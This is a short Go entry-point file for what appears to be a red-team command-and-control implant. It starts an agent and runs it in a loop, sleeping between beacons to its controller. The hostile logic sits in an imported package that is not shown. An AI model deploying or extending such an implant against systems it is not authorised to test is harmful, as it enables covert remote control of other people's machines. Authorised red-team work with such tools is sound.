package main

import (
	"time"

	"github.com/slackr/redchannel-agent/implant"
)

func main() {
	agent := implant.Agent{}

	agent.Init()
	for agent.IsShutdown() != true {
		agent.Run()
		time.Sleep(time.Duration(agent.GetC2Interval()) * time.Millisecond)
	}
}
